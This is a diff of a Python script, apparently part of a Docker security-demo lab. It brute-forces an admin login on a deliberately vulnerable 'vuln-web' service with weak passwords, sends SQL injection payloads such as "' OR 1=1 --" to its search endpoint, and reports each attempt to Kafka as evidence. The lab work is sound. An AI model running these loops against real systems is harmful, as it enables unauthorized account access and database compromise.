@@ -1,78 +1,74 @@
-# 文件路径: producer/producer.py
 import time
 import json
 import requests
 import os
 from kafka import KafkaProducer
 
-# 获取 Docker 环境变量里的 Kafka 地址
 KAFKA_BROKER = os.environ.get('KAFKA_BROKER', 'kafka:9092')
 TOPIC = 'evidence_topic'
-# 注意：这里使用服务名 'vuln-web'，因为它们在同一个 Docker 网络里
-TARGET_URL = 'http://vuln-web:5000/login'
+
+LOGIN_URL = 'http://vuln-web:5000/login'
+SEARCH_URL = 'http://vuln-web:5000/search'
 
 def get_producer():
-    # 增加重试机制，确保 Kafka 启动时可以连接上
     while True:
         try:
-            print(f"正在连接 Kafka: {KAFKA_BROKER} ...")
             producer = KafkaProducer(
                 bootstrap_servers=[KAFKA_BROKER],
                 value_serializer=lambda x: json.dumps(x).encode('utf-8')
             )
-            print("Kafka 连接成功！")
             return producer
-        except Exception as e:
-            print(f"Kafka 连接失败，5秒后重试: {e}")
+        except:
             time.sleep(5)
 
-def run_attack():
-    producer = get_producer()
+# --- 修复点：增加了 http_status 参数 ---
+def send_evidence(producer, attack_type, target, payload, success, http_status=0):
+    evidence = {
+        "timestamp": time.time(),
+        "attack_type": attack_type,
+        "target": target,
+        "payload": payload,
+        "result": "success" if success else "fail",
+        "http_status": http_status  # 补上了这个字段
+    }
+    producer.send(TOPIC, value=evidence)
+    producer.flush()
+    print(f"[*] 发送证据: [{attack_type}] {payload} -> {evidence['result']}")
 
-    # 读取密码字典
-    with open('payloads.txt', 'r') as f:
-        passwords = [line.strip() for line in f.readlines()]
-
-    print("=== 开始自动化暴力破解漏洞复现 ===")
-
+def run_brute_force(producer):
+    print("\n--- 启动模块: 弱口令暴力破解 ---")
+    passwords = ["123456", "password", "admin", "admin123"]
     for password in passwords:
-        payload = {"username": "admin", "password": password}
-
         try:
-            # 发起真实的 HTTP 攻击请求
-            response = requests.post(TARGET_URL, json=payload, timeout=5)
+            resp = requests.post(LOGIN_URL, json={"username": "admin", "password": password}, timeout=2)
+            success = (resp.status_code == 200)
+            # 传入状态码
+            send_evidence(producer, "brute_force", LOGIN_URL, password, success, http_status=resp.status_code)
+            if success: break
+        except: pass
+        time.sleep(0.5)
 
-            # 判断攻击结果
-            is_success = (response.status_code == 200)
-            status_str = "攻击成功！(SUCCESS)" if is_success else "失败 (Fail)"
-
-            print(f"[*] 尝试密码: {password} -> {status_str}")
-
-            # 构造 Evidence 证据数据
-            evidence = {
-                "timestamp": time.time(),
-                "attack_type": "brute_force",
-                "target": TARGET_URL,
-                "payload": password,
-                "http_status": response.status_code,
-                "result": "success" if is_success else "fail"
-            }
-
-            # 发送给 Kafka
-            producer.send(TOPIC, value=evidence)
-            producer.flush()
-
-        except Exception as e:
-            # 如果网站还没启动或网络不通，会报错
-            print(f"[!] 请求靶机出错，可能服务未启动: {e}")
-
-        time.sleep(1) 
-
-    print("=== 本轮攻击完成 ===")
+def run_sql_injection(producer):
+    print("\n--- 启动模块: SQL 注入探测 ---")
+    sqli_payloads = ["admin", "test_user", "' OR '1'='1", "' OR 1=1 --"]
+    for payload in sqli_payloads:
+        try:
+            resp = requests.get(SEARCH_URL, params={"q": payload}, timeout=2)
+            success = (resp.status_code == 200)
+            if success:
+                print(f"!!! 发现 SQL 注入漏洞 !!!")
+            # 传入状态码
+            send_evidence(producer, "sql_injection", SEARCH_URL, payload, success, http_status=resp.status_code)
+        except: pass
+        time.sleep(1)
 
 if __name__ == '__main__':
-    # 循环运行，每 30 秒执行一次完整的字典攻击
+    producer = get_producer()
+    print("攻击者服务已就绪...")
     while True:
-        run_attack()
-        time.sleep(30)
-
+        run_brute_force(producer)
+        time.sleep(2)
+        run_sql_injection(producer)
+        # 缩短等待时间，让演示更流畅
+        print("\n=== 等待下一轮攻击循环 (3秒) ===")
+        time.sleep(3)
